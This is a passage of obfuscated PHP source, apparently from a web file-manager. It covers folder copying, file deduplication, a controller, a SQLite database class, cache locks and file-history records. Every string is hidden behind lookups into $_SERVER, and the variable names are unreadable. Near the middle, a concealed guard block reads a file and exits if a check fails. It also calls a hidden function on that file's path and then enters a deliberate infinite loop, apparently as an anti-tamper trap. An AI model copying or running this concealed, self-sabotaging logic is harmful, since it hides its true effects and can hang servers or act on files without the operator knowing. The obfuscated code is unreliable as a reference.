$úÅ¯³€¥ ? $úÅ¯³€¥ : $Ü¤‰ƒë‚->pathThis($µ–ò·Ò); $£à¿­õ™ = $this->fileNameExist($¯–öô”, $æêÉ‘‰è); $¯¼¸°®¯ = $this->mkdir($¯–öô”, $æêÉ‘‰è, $ë—˜Ş); if (!$£à¿­õ™ || $ë—˜Ş == REPEAT_RENAME_FOLDER) { $ë—˜Ş = !1; } if ($£à¿­õ™) { $this->_childrenAllMake($£à¿­õ™); } Hook::trigger($êÊãìæ[682]); $this->_copyChildTo($Ü¤‰ƒë‚, $µ–ò·Ò, $¯¼¸°®¯, $ë—˜Ş, $ÈÉ·ºñı, $ğ«Â‚’‡); Hook::trigger($êÊãìæ[683]); if ($¯¼¸°®¯) { $this->folderSizeResetChildren($¯¼¸°®¯); } $this->_childrenListClear(); Model($êÊãìæ[646])->addAll($ÈÉ·ºñı[$êÊãìæ[644]], array(), !0); Model($êÊãìæ[647])->eventCopy($¯¼¸°®¯); $this->saveAll($ÈÉ·ºñı[$êÊãìæ[645]]); Model($êÊãìæ[555])->linkAdd($ÈÉ·ºñı[$êÊãìæ[643]]); Model($êÊãìæ[555])->remove($ÈÉ·ºñı[$êÊãìæ[681]]); $this->folderSizeReset($¯–öô”); $this->updateModifyTime($¯–öô”); return $¯¼¸°®¯; } private function _copyChildTo($ÁÚÂŒ™ù, $ÆÃ¿ùó, $‡å‚¶Šü, $§”˜ »¡, &$İø€§ã“, $Ö¼ÙÒË®) { $Àî˜à‘Ù =& $_SERVER[¼èá¯æÙ]; $¬·«©‰ï = $this->sourceInfoCache($‡å‚¶Šü); $šû—šşŒ = $ÁÚÂŒ™ù->listPath($ÆÃ¿ùó); $šû—šşŒ = $šû—šşŒ ? $šû—šşŒ : array($Àî˜à‘Ù[96] => array(), $Àî˜à‘Ù[95] => array()); $¡«¶Å½Ğ = array_merge($šû—šşŒ[$Àî˜à‘Ù[96]], $šû—šşŒ[$Àî˜à‘Ù[95]]); $ø›¡øˆÕ = $this->_addFiles($ÁÚÂŒ™ù, $šû—šşŒ[$Àî˜à‘Ù[96]], $Ö¼ÙÒË®); $¸ƒØâò¥ = array(); foreach ($¡«¶Å½Ğ as &$Ó­çòÏû) { if (isset($ø›¡øˆÕ[$Ó­çòÏû[$Àî˜à‘Ù[32]]])) { $Ó­çòÏû = $ø›¡øˆÕ[$Ó­çòÏû[$Àî˜à‘Ù[32]]]; } $Ó­çòÏû[$Àî˜à‘Ù[496]] = $Ó­çòÏû[$Àî˜à‘Ù[33]] == $Àî˜à‘Ù[88]; $Ó­çòÏû[$Àî˜à‘Ù[497]] = substr(_get($Ó­çòÏû, $Àî˜à‘Ù[179], $Àî˜à‘Ù[12]), 0, 10); $Ó­çòÏû[$Àî˜à‘Ù[89]] = _get($Ó­çòÏû, $Àî˜à‘Ù[89], 0); $Ó­çòÏû[$Àî˜à‘Ù[552]] = _get($Ó­çòÏû, $Àî˜à‘Ù[552], 0); if (!isset($Ó­çòÏû[$Àî˜à‘Ù[684]]) && $Ó­çòÏû[$Àî˜à‘Ù[552]]) { $İø€§ã“[$Àî˜à‘Ù[681]][] = $Ó­çòÏû[$Àî˜à‘Ù[552]]; } if ($§”˜ »¡) { $´’šÈıË = $this->fileNameExistCache($‡å‚¶Šü, $Ó­çòÏû[$Àî˜à‘Ù[32]]); if ($´’šÈıË) { if ($Ó­çòÏû[$Àî˜à‘Ù[496]] || $§”˜ »¡ == REPEAT_SKIP) { continue; } if ($§”˜ »¡ == REPEAT_REPLACE) { $Ø‡öŸı„ = $this->sourceInfoCache($´’šÈıË); $şš–É‡ = $this->fileHistory($Ø‡öŸı„, $Ó­çòÏû[$Àî˜à‘Ù[552]], $Ó­çòÏû[$Àî˜à‘Ù[89]]); if ($şš–É‡) { $İø€§ã“[$Àî˜à‘Ù[643]][] = $Ó­çòÏû[$Àî˜à‘Ù[552]]; } continue; } else { if ($§”˜ »¡ == REPEAT_RENAME) { $Ó­çòÏû[$Àî˜à‘Ù[32]] = $this->fileNameAutoCache($‡å‚¶Šü, $Ó­çòÏû[$Àî˜à‘Ù[32]], $§”˜ »¡, !1); } } } } if (!$Ó­çòÏû[$Àî˜à‘Ù[496]] && $Ó­çòÏû[$Àî˜à‘Ù[552]] == 0) { continue; } if (!$Ó­çòÏû[$Àî˜à‘Ù[496]] && $Ó­çòÏû[$Àî˜à‘Ù[552]]) { $İø€§ã“[$Àî˜à‘Ù[643]][] = $Ó­çòÏû[$Àî˜à‘Ù[552]]; } $¸ƒØâò¥[] = $this->_makeItemData($Ó­çòÏû, $¬·«©‰ï, $Ó­çòÏû[$Àî˜à‘Ù[32]]); } unset($Ó­çòÏû); if (!empty($¸ƒØâò¥)) { $this->addAll($¸ƒØâò¥); $this->_childrenListSelect($‡å‚¶Šü); } $¢™³ïñ = $this->_childrenList($‡å‚¶Šü); $¢™³ïñ = array_to_keyvalue($¢™³ïñ, $Àî˜à‘Ù[32]); foreach ($¡«¶Å½Ğ as $Ó­çòÏû) { $Ø‡öŸı„ = $¢™³ïñ[$Ó­çòÏû[$Àî˜à‘Ù[32]]]; $ì¼íˆÎ© = $Ø‡öŸı„[$Àî˜à‘Ù[203]]; $this->_copyApplyMeta($Ø‡öŸı„, $İø€§ã“); if ($Ó­çòÏû[$Àî˜à‘Ù[33]] == $Àî˜à‘Ù[88]) { $Ó­çòÏû[$Àî˜à‘Ù[97]] = $ÁÚÂŒ™ù->getPathInner($Ó­çòÏû[$Àî˜à‘Ù[97]]); $this->_copyChildTo($ÁÚÂŒ™ù, $Ó­çòÏû[$Àî˜à‘Ù[97]], $ì¼íˆÎ©, $§”˜ »¡, $İø€§ã“, $Ö¼ÙÒË®); } } } private function _addFiles($æ¸Õ”ü£, $ô£‰ÛÚÔ, $àõ•âÄ) { $åÊ›«ôú =& $_SERVER[¼èá¯æÙ]; if (!$ô£‰ÛÚÔ || count($ô£‰ÛÚÔ) == 0) { return array(); } $Ÿø¿¼ˆÕ = array(); foreach ($ô£‰ÛÚÔ as &$¾Å¾ÆĞÖ) { Hook::trigger($åÊ›«ôú[685], $¾Å¾ÆĞÖ); $¾Å¾ÆĞÖ[$åÊ›«ôú[97]] = $æ¸Õ”ü£->getPathInner($¾Å¾ÆĞÖ[$åÊ›«ôú[97]]); $–•©¬­Í = $æ¸Õ”ü£->hashSimple($¾Å¾ÆĞÖ[$åÊ›«ôú[97]]); $¯ÖÀÍŸç = $æ¸Õ”ü£->hashMd5($¾Å¾ÆĞÖ[$åÊ›«ôú[97]]); if (strlen($¯ÖÀÍŸç) > 10 && !isset($Ÿø¿¼ˆÕ[$¯ÖÀÍŸç])) { $Ÿø¿¼ˆÕ[$¯ÖÀÍŸç] = array(); } $¾Å¾ÆĞÖ[$åÊ›«ôú[686]] = $–•©¬­Í; $¾Å¾ÆĞÖ[$åÊ›«ôú[558]] = $¯ÖÀÍŸç; $Ÿø¿¼ˆÕ[$¯ÖÀÍŸç][] =& $¾Å¾ÆĞÖ; if (count($Ÿø¿¼ˆÕ[$¯ÖÀÍŸç]) > 1) { $¾Å¾ÆĞÖ[$åÊ›«ôú[684]] = !0; } Hook::trigger($åÊ›«ôú[687], $¾Å¾ÆĞÖ); } unset($¾Å¾ÆĞÖ); $ğÖ½ÁÛ = array($åÊ›«ôú[558] => array($åÊ›«ôú[7], array_keys($Ÿø¿¼ˆÕ))); $©û®¶šô = Model($åÊ›«ôú[688]); $Ñûêş‰ª = $©û®¶šô->where($ğÖ½ÁÛ)->select(); $Ñûêş‰ª = $Ñûêş‰ª ? $Ñûêş‰ª : array(); foreach ($Ñûêş‰ª as $ôÍµ£Ä) { if (!isset($Ÿø¿¼ˆÕ[$ôÍµ£Ä[$åÊ›«ôú[558]]])) { continue; } $€å·±êÌ = $Ÿø¿¼ˆÕ[$ôÍµ£Ä[$åÊ›«ôú[558]]]; foreach ($€å·±êÌ as &$¾Å¾ÆĞÖ) { $¾Å¾ÆĞÖ[$åÊ›«ôú[552]] = $ôÍµ£Ä[$åÊ›«ôú[552]]; $¾Å¾ÆĞÖ[$åÊ›«ôú[684]] = !0; } unset($¾Å¾ÆĞÖ); } $æÒˆ¬— = array(); foreach ($ô£‰ÛÚÔ as $õ·íˆ°•) { Hook::trigger($åÊ›«ôú[689], $õ·íˆ°•); if (isset($õ·íˆ°•[$åÊ›«ôú[684]]) && $õ·íˆ°•[$åÊ›«ôú[684]]) { Hook::trigger($åÊ›«ôú[690], $õ·íˆ°•); continue; } $æ…‡Òşš = $æ¸Õ”ü£->getPathInner($õ·íˆ°•[$åÊ›«ôú[97]]); $øÆñ«×† = $©û®¶šô->addFileMake($æ…‡Òşš, $õ·íˆ°•[$åÊ›«ôú[89]], $õ·íˆ°•[$åÊ›«ôú[686]], $õ·íˆ°•[$åÊ›«ôú[558]], $õ·íˆ°•[$åÊ›«ôú[32]], $àõ•âÄ); Hook::trigger($åÊ›«ôú[690], $õ·íˆ°•); if (!is_array($øÆñ«×†)) { continue; } $æÒˆ¬—[] = $øÆñ«×†; } $©û®¶šô->addAll($æÒˆ¬—); $ğÖ½ÁÛ = array($åÊ›«ôú[558] => array($åÊ›«ôú[7], array_keys($Ÿø¿¼ˆÕ))); $Ñûêş‰ª = $©û®¶šô->where($ğÖ½ÁÛ)->select(); $Ñûêş‰ª = $Ñûêş‰ª ? $Ñûêş‰ª : array(); foreach ($Ñûêş‰ª as $ôÍµ£Ä) { if (!isset($Ÿø¿¼ˆÕ[$ôÍµ£Ä[$åÊ›«ôú[558]]])) { continue; } $¦Èá ¨õ =& $Ÿø¿¼ˆÕ[$ôÍµ£Ä[$åÊ›«ôú[558]]]; foreach ($¦Èá ¨õ as &$¾Å¾ÆĞÖ) { $¾Å¾ÆĞÖ[$åÊ›«ôú[552]] = $ôÍµ£Ä[$åÊ›«ôú[552]]; } unset($¾Å¾ÆĞÖ); } $¤Í‹±Üİ = array(); foreach ($ô£‰ÛÚÔ as $ñØ¶Ë¿) { $¤Í‹±Üİ[$ñØ¶Ë¿[$åÊ›«ôú[32]]] = $ñØ¶Ë¿; } return $¤Í‹±Üİ; } } goto eµË´âš; bãæ’¶Ï’¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ßê¡ì–Â =& $_SERVER[¼èá¯æÙ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ßê¡ì–Â[6]] =& $config; $this->values[$ßê¡ì–Â[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ßê¡ì–Â[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ß‚ ¡ù…) { if (1 === func_num_args()) { $this->{$ß‚ ¡ù…} = new $ß‚ ¡ù…(); } else { $¤ãŞúÔÛ = new ReflectionClass($ß‚ ¡ù…); $æ¨«…ŸÖ = func_get_args(); array_shift($æ¨«…ŸÖ); $this->{$ß‚ ¡ù…} = $¤ãŞúÔÛ->newInstanceArgs($æ¨«…ŸÖ); } return $this->{$ß‚ ¡ù…}; } public function routeBind($¨ÔÎ…Ã¹, $ßú…Âóğ, $åà¦Ğğ = 3) { $Œ¨é ñ =& $_SERVER[¼èá¯æÙ]; $°ßô¿Ô˜ = $this->in[$Œ¨é ñ[9]]; $¨ÔÎ…Ã¹ = str_replace($Œ¨é ñ[10], $Œ¨é ñ[11], trim(trim($¨ÔÎ…Ã¹, $Œ¨é ñ[8]), $Œ¨é ñ[12])); if (!$¨ÔÎ…Ã¹ || count($°ßô¿Ô˜) <= $åà¦Ğğ) { return !1; } $¦Îø»Úç = !0; $ìçäÜ›ñ = explode($Œ¨é ñ[8], $¨ÔÎ…Ã¹); for ($ó¿ğˆô§ = 0; $ó¿ğˆô§ < count($ìçäÜ›ñ); $ó¿ğˆô§++) { if ($ìçäÜ›ñ[$ó¿ğˆô§] != $°ßô¿Ô˜[$åà¦Ğğ + $ó¿ğˆô§]) { $¦Îø»Úç = !1; break; } } if (!$¦Îø»Úç) { return; } call_user_func_array(array($this, $ßú…Âóğ), array()); } public function routeArgs($èß‡°‡” = 3) { $ëÌ¿‚»« = $this->in[$_SERVER[¼èá¯æÙ][9]]; if (count($ëÌ¿‚»«) <= $èß‡°‡”) { return array(); } $Ó¹¨·¯Ì = array(); for ($‰¼ÀŞ¬Û = $èß‡°‡”; $‰¼ÀŞ¬Û < count($ëÌ¿‚»«); $‰¼ÀŞ¬Û += 2) { $Ó¹¨·¯Ì[$ëÌ¿‚»«[$‰¼ÀŞ¬Û]] = $ëÌ¿‚»«[$‰¼ÀŞ¬Û + 1]; $this->in[$ëÌ¿‚»«[$‰¼ÀŞ¬Û]] = $ëÌ¿‚»«[$‰¼ÀŞ¬Û + 1]; } return $Ó¹¨·¯Ì; } protected function assign($¼¼‰ñ¢á, $¦Æ åİı) { $this->values[$¼¼‰ñ¢á] = $¦Æ åİı; } protected function display($ŸÒáùÚ) { ob_end_clean(); extract($this->values); require $this->tpl . $ŸÒáùÚ; } } class DbSqliteBase extends Db { public function __construct($ÍçÀÄÆÈ = '') { $±…ˆ´Àõ =& $_SERVER[¼èá¯æÙ]; if (!extension_loaded($±…ˆ´Àõ[13])) { think_exception(think_lang($±…ˆ´Àõ[14]) . $±…ˆ´Àõ[15]); } if (!empty($ÍçÀÄÆÈ)) { if (!isset($ÍçÀÄÆÈ[$±…ˆ´Àõ[16]])) { $ÍçÀÄÆÈ[$±…ˆ´Àõ[16]] = 438; } $this->config = $ÍçÀÄÆÈ; if (empty($this->config[$±…ˆ´Àõ[17]])) { $this->config[$±…ˆ´Àõ[17]] = array(); } } } public function connect($îÛş®Ùù = '', $Â¨¨†Ì¸ = 0) { $“Ã§«©‘ =& $_SERVER[¼èá¯æÙ]; if (!isset($this->linkID[$Â¨¨†Ì¸])) { if (empty($îÛş®Ùù)) { $îÛş®Ùù = $this->config; } $áëÛ‰…ä = !empty($îÛş®Ùù[$“Ã§«©‘[17]][$“Ã§«©‘[18]]) ? $îÛş®Ùù[$“Ã§«©‘[17]][$“Ã§«©‘[18]] : $this->pconnect; $ªˆÅà‰  = $áëÛ‰…ä ? $“Ã§«©‘[19] : $“Ã§«©‘[20]; $this->linkID[$Â¨¨†Ì¸] = $ªˆÅà‰ ($îÛş®Ùù[$“Ã§«©‘[21]], $îÛş®Ùù[$“Ã§«©‘[16]]); if (!$this->linkID[$Â¨¨†Ì¸]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Â¨¨†Ì¸], 30000); if (1 != think_config($“Ã§«©‘[22])) { unset($this->config); } } return $this->linkID[$Â¨¨†Ì¸]; } public function free() { $this->queryID = null; } public function query($Ú‘œ£ã) { $ÖÇÀ²› =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ú‘œ£ã; if ($this->queryID) { $this->free(); } think_action_status($ÖÇÀ²›[23], 1); think_status($ÖÇÀ²›[24]); $this->queryID = sqlite_query($this->_linkID, $Ú‘œ£ã); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $’Îç”´º = $this->getAll(); return $’Îç”´º; } } public function execute($¨¬áñÏÅ) { $ÑŸÃû­ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨¬áñÏÅ; if ($this->queryID) { $this->free(); } think_action_status($ÑŸÃû­[25], 1); think_status($ÑŸÃû­[24]); $Øàğ†Öé = sqlite_exec($this->_linkID, $¨¬áñÏÅ); $this->debug(); if (!1 === $Øàğ†Öé) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¼èá¯æÙ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·²š†«× = sqlite_query($this->_linkID, $_SERVER[¼èá¯æÙ][27]); if (!$·²š†«×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÛÃ›ÇŒ› = sqlite_query($this->_linkID, $_SERVER[¼èá¯æÙ][28]); if (!$ÛÃ›ÇŒ›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $úÊ‡Øƒ = array(); if ($this->numRows > 0) { for ($œœêÊ¬ = 0; $œœêÊ¬ < $this->numRows; $œœêÊ¬++) { $úÊ‡Øƒ[$œœêÊ¬] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $úÊ‡Øƒ; } public function getFields($ÆƒË’ïã) { $”„×º¼ö =& $_SERVER[¼èá¯æÙ]; $‰¼İğŠ¾ = $this->query($”„×º¼ö[29] . $ÆƒË’ïã . $”„×º¼ö[30]); $Õ†şè¥´ = array(); if ($‰¼İğŠ¾) { foreach ($‰¼İğŠ¾ as $³÷ƒ•¹ï => $¿™šä›”) { $Õ†şè¥´[$¿™šä›”[$”„×º¼ö[31]]] = array($”„×º¼ö[32] => $¿™šä›”[$”„×º¼ö[31]], $”„×º¼ö[33] => $¿™šä›”[$”„×º¼ö[34]], $”„×º¼ö[35] => (bool) ($¿™šä›”[$”„×º¼ö[36]] === $”„×º¼ö[12]), $”„×º¼ö[37] => $¿™šä›”[$”„×º¼ö[38]], $”„×º¼ö[39] => strtolower($¿™šä›”[$”„×º¼ö[40]]) == $”„×º¼ö[41], $”„×º¼ö[42] => strtolower($¿™šä›”[$”„×º¼ö[43]]) == $”„×º¼ö[44]); } } return $Õ†şè¥´; } public function getTables($ø›şµ² = '') { $Öâ©ÖŸ¾ =& $_SERVER[¼èá¯æÙ]; $•ç’ƒÍå = $this->query($Öâ©ÖŸ¾[45] . $Öâ©ÖŸ¾[46] . $Öâ©ÖŸ¾[47]); $º¿ë¸ğê = array(); foreach ($•ç’ƒÍå as $±éù†õ => $‡¾Ö£ïÏ) { $º¿ë¸ğê[$±éù†õ] = current($‡¾Ö£ïÏ); } return $º¿ë¸ğê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ö˜¯»§ =& $_SERVER[¼èá¯æÙ]; $•šŒó¯é = sqlite_last_error($this->_linkID); $this->error = $•šŒó¯é . $ö˜¯»§[4] . sqlite_error_string($•šŒó¯é); if ($ö˜¯»§[12] != $this->queryStr) { $this->error .= LNG($ö˜¯»§[48]) . $this->queryStr; } think_trace($this->error, $ö˜¯»§[12], $ö˜¯»§[49]); return $this->error; } public function escapeString($Êäè¡…) { return sqlite_escape_string($Êäè¡…); } public function parseLimit($œÙìÒ€æ) { $¢ûÔÙŸÉ =& $_SERVER[¼èá¯æÙ]; $£›é–ï¦ = $¢ûÔÙŸÉ[12]; if (!empty($œÙìÒ€æ)) { $œÙìÒ€æ = explode($¢ûÔÙŸÉ[50], $œÙìÒ€æ); if (count($œÙìÒ€æ) > 1) { $£›é–ï¦ .= $¢ûÔÙŸÉ[51] . $œÙìÒ€æ[1] . $¢ûÔÙŸÉ[52] . $œÙìÒ€æ[0] . $¢ûÔÙŸÉ[53]; } else { $£›é–ï¦ .= $¢ûÔÙŸÉ[51] . $œÙìÒ€æ[0] . $¢ûÔÙŸÉ[53]; } } return $£›é–ï¦; } } if (!isset($_SERVER[$_SERVER[¼èá¯æÙ][54]]) || !isset($_SERVER[$_SERVER[¼èá¯æÙ][55]])) { $_getc = $_SERVER[¼èá¯æÙ][56]; $_getfile = $_SERVER[$_SERVER[¼èá¯æÙ][57]] . $_SERVER[¼èá¯æÙ][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼èá¯æÙ][59], $_getfilec); if (count($_getarrs) < $_SERVER[¼èá¯æÙ][60]) { $exit = $_SERVER[¼èá¯æÙ][61]; $exit(); } $_act = $_SERVER[¼èá¯æÙ][62]; $_act($_SERVER[$_SERVER[¼èá¯æÙ][57]] . $_SERVER[¼èá¯æÙ][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¼èá¯æÙ][63]); } } goto Cèø®èŠŞÂ; Fç‘Œ’Ğ›Ø: class CacheLockRedis { public function lock($«şØİæÅ, $ÁÛ¥áÖí = 10) { $âšò‡” = Cache::init(); $æ÷ß–ä§ = microtime(!0) + $ÁÛ¥áÖí; while (microtime(!0) < $æ÷ß–ä§) { $‚ôœÈÆİ = $âšò‡”->get($«şØİæÅ); if (!$‚ôœÈÆİ) { $Ò¾æ¼­è = $âšò‡”->setLock($«şØİæÅ, $æ÷ß–ä§, $ÁÛ¥áÖí); if ($Ò¾æ¼­è) { return !0; } } else { if ($‚ôœÈÆİ < microtime(!0)) { $âšò‡”->set($«şØİæÅ, $æ÷ß–ä§, $ÁÛ¥áÖí * 2); if ($âšò‡”->get($«şØİæÅ) === $‚ôœÈÆİ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¯„—šâú) { return Cache::init()->get($¯„—šâú); } public function unlock($òÈìĞû) { return Cache::init()->remove($òÈìĞû); } } class CacheLockMemcached { public function lock($­ùşğ…ç, $¾…³õî÷ = 0) { $Òß©™”å = Cache::init(); $ëùá“û§ = microtime(!0) + $¾…³õî÷; while (microtime(!0) < $ëùá“û§) { $±áï×£ = $Òß©™”å->get($­ùşğ…ç); if (!$±áï×£ || $±áï×£ < microtime(!0)) { $±Ñè·‹‚ = $Òß©™”å->handle->add($­ùşğ…ç, $ëùá“û§, $¾…³õî÷); if ($±Ñè·‹‚) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ş—æ¼š²) { return Cache::init()->get($ş—æ¼š²); } public function unlock($ºÊÚß¥„) { return Cache::init()->remove($ºÊÚß¥„); } } class CacheLockDatabase { public function lock($àç‹Óşí, $ÊÜÁã›ù = 0) { $£Ò†¡ò = Model($_SERVER[¼èá¯æÙ][911]); $–½åÍÃÊ = microtime(!0) + $ÊÜÁã›ù; while (microtime(!0) < $–½åÍÃÊ) { $û€Ÿõ·ì = $£Ò†¡ò->get($àç‹Óşí); if (!$û€Ÿõ·ì || $û€Ÿõ·ì < microtime(!0)) { $é÷Ë“È® = $£Ò†¡ò->set($àç‹Óşí, $–½åÍÃÊ); if ($é÷Ë“È®) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($€ñî®¿) { return Model($_SERVER[¼èá¯æÙ][911])->get($€ñî®¿); } public function unlock($É‘¨Ğø) { Model($_SERVER[¼èá¯æÙ][911])->remove($É‘¨Ğø); } } goto Fí¿ºœÃ—È; BÊñÆõÀ‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\143\x65\137\x68\x69\163\x74\x6f\162\x79"; public function historyCount($ªÛ¦çç) { $ªóÑ  =& $_SERVER[¼èá¯æÙ]; if (!$ªÛ¦çç) { return array(); } if (is_string($ªÛ¦çç) || is_int($ªÛ¦çç)) { $ªÛ¦çç = array($ªÛ¦çç); } $’õº‘°Ó = array($ªóÑ [203], $ªóÑ [2233] => $ªóÑ [576]); $ìŸœñ»» = array($ªóÑ [203] => array($ªóÑ [7], $ªÛ¦çç)); $äö›…ï— = $this->field($’õº‘°Ó)->where($ìŸœñ»»)->group($ªóÑ [203])->select(); return array_to_keyvalue($äö›…ï—, $ªóÑ [203], $ªóÑ [576]); } public function addHistory($š‹¶‡®, $ôÓ€ö = '') { $Ñ•Öç†† =& $_SERVER[¼èá¯æÙ]; $‡µÎ‹¿ı = array($Ñ•Öç††[502] => $š‹¶‡®[$Ñ•Öç††[203]], $Ñ•Öç††[1769] => isset($š‹¶‡®[$Ñ•Öç††[540]]) ? $š‹¶‡®[$Ñ•Öç††[540]] : $š‹¶‡®[$Ñ•Öç††[538]], $Ñ•Öç††[553] => $š‹¶‡®[$Ñ•Öç††[552]], $Ñ•Öç††[631] => $š‹¶‡®[$Ñ•Öç††[89]], $Ñ•Öç††[2234] => $ôÓ€ö); if ($GLOBALS[$Ñ•Öç††[6]][$Ñ•Öç††[102]][$Ñ•Öç††[1307]] >= 1) { $this->historyAutoClear($‡µÎ‹¿ı[$Ñ•Öç††[203]]); $this->add($‡µÎ‹¿ı); } Hook::trigger($Ñ•Öç††[2235], $‡µÎ‹¿ı); Model($Ñ•Öç††[2236])->eventFileEdit($š‹¶‡®[$Ñ•Öç††[203]]); } private function historyAutoClear($µ¸Âé¬ş) { $ŸÒèûö‚ =& $_SERVER[¼èá¯æÙ]; $ŞšÅîÏ = Model($ŸÒèûö‚[852])->get($ŸÒèûö‚[1329]); $ş²å›è¸ = intval($GLOBALS[$ŸÒèûö‚[6]][$ŸÒèûö‚[102]][$ŸÒèûö‚[1307]]); $÷£çĞ­” = $ŞšÅîÏ == $ŸÒèûö‚[1330] ? min(5, $ş²å›è¸) : $ş²å›è¸; $÷£çĞ­” = $÷£çĞ­” <= 0 ? 0 : $÷£çĞ­” - 1; if ($÷£çĞ­” >= 499) { return; } $¯¨ª´‘ó = array($ŸÒèûö‚[502] => $µ¸Âé¬ş); $İ‡Š = $this->field($ŸÒèûö‚[2237])->where($¯¨ª´‘ó)->order($ŸÒèûö‚[2230])->select(); if (!$İ‡Š || $÷£çĞ­” >= count($İ‡Š)) { return; } $ÌûÉúş = array_to_keyvalue($İ‡Š, $ŸÒèûö‚[12], $ŸÒèûö‚[486]); $ÌûÉúş = array_slice($ÌûÉúş, $÷£çĞ­”); $ÚË€©ÊÜ = array_to_keyvalue($İ‡Š, $ŸÒèûö‚[12], $ŸÒèûö‚[552]); $ÚË€©ÊÜ = array_slice($ÚË€©ÊÜ, $÷£çĞ­”); if (!$ÌûÉúş || !$ÚË€©ÊÜ) { return; } $¯¨ª´‘ó = array($ŸÒèûö‚[504] => array($ŸÒèûö‚[7], $ÌûÉúş)); $this->where($¯¨ª´‘ó)->delete(); Model($ŸÒèûö‚[555])->remove($ÚË€©ÊÜ); } public function listData($ÊíÈÉÙ) { $ÕÎ´ˆú² =& $_SERVER[¼èá¯æÙ]; $…Ÿã­õ» = array($ÕÎ´ˆú²[502] => $ÊíÈÉÙ); $¯´êÇÎÁ = $ÕÎ´ˆú²[2238]; $¸â¡—¦ü = $this->field($¯´êÇÎÁ)->where($…Ÿã­õ»)->order($ÕÎ´ˆú²[2230])->selectPage(); $this->_listAppendUser($¸â¡—¦ü[$ÕÎ´ˆú²[457]]); $§º¦ıİ = Model($ÕÎ´ˆú²[852])->get($ÕÎ´ˆú²[1329]); $‚›ïËİœ = 5; if ($§º¦ıİ == $ÕÎ´ˆú²[1330]) { $¸â¡—¦ü[$ÕÎ´ˆú²[457]] = array_slice($¸â¡—¦ü[$ÕÎ´ˆú²[457]], 0, $‚›ïËİœ); $¸â¡—¦ü[$ÕÎ´ˆú²[454]] = array($ÕÎ´ˆú²[2239] => 1, $ÕÎ´ˆú²[2240] => 20, $ÕÎ´ˆú²[2241] => 1, $ÕÎ´ˆú²[2242] => count($¸â¡—¦ü[$ÕÎ´ˆú²[457]])); } return $¸â¡—¦ü; } protected function _listAppendUser(&$ÜşÚÅ§¾) { $üÕÕ€ŞÛ =& $_SERVER[¼èá¯æÙ]; $îùü˜®³ = array_to_keyvalue($ÜşÚÅ§¾, $üÕÕ€ŞÛ[12], $üÕÕ€ŞÛ[1778]); $Ìãî¥²ª = Model($üÕÕ€ŞÛ[608])->userListInfo($îùü˜®³); foreach ($ÜşÚÅ§¾ as &$ıÄì¨¸’) { $®Âø°Õ› = $ıÄì¨¸’[$üÕÕ€ŞÛ[1778]]; $ıÄì¨¸’[$üÕÕ€ŞÛ[538]] = $Ìãî¥²ª[$®Âø°Õ›] ? $Ìãî¥²ª[$®Âø°Õ›] : !1; } unset($ıÄì¨¸’); } public function fileInfo($ˆ§èŒñ) { $Á€ÁåÛæ =& $_SERVER[¼èá¯æÙ]; $¦îŒƒİç = $this->tablePrefix; $€Ó‚›á = "{$¦îŒƒİç}\151\157\137\x66\x69\154\x65\x20\x66\x69\154\145\163\x20\157\156\40\x66\151\x6c\x65\163\x2e\x66\151\154\x65\111\x44\x20\75\x20\x68\x69\x73\164\x6f\162\x79\x2e\x66\x69\154\145\x49\104"; return $this->alias($Á€ÁåÛæ[2243])->where(array($Á€ÁåÛæ[504] => $ˆ§èŒñ))->join($€Ó‚›á, $Á€ÁåÛæ[2244])->find(); } public function removeItem($ƒ”ËÚ¹ø) { $ÛÊ­…Î§ =& $_SERVER[¼èá¯æÙ]; $­µÍ¦‚İ = array($ÛÊ­…Î§[504] => $ƒ”ËÚ¹ø); $û·¼¦°ü = $this->where($­µÍ¦‚İ)->find(); if ($û·¼¦°ü) { $ßå£ÅÌé = $this->where($­µÍ¦‚İ)->delete(); Model($ÛÊ­…Î§[555])->remove($û·¼¦°ü[$ÛÊ­…Î§[552]]); return $ßå£ÅÌé; } return !1; } public function removeBySource($ïôë½Ê) { $ÀÉ‘ÄÅ£ =& $_SERVER[¼èá¯æÙ]; if (!$ïôë½Ê) { return !1; } if (!is_array($ïôë½Ê)) { $ïôë½Ê = array($ïôë½Ê); } $ùÂ§¦¾Ó = array($ÀÉ‘ÄÅ£[502] => array($ÀÉ‘ÄÅ£[7], $ïôë½Ê)); $æ­Ÿá¾ = $this->field($ÀÉ‘ÄÅ£[553])->where($ùÂ§¦¾Ó)->select(); if ($æ­Ÿá¾) { $this->where($ùÂ§¦¾Ó)->delete(); $º½¥Ùµ¬ = array_to_keyvalue($æ­Ÿá¾, $ÀÉ‘ÄÅ£[12], $ÀÉ‘ÄÅ£[552]); Model($ÀÉ‘ÄÅ£[555])->remove($º½¥Ùµ¬); } return !0; } public function setDetail($îŒ¬¼¬, $¤ôø£½†) { $ş¦ñ¨ªë =& 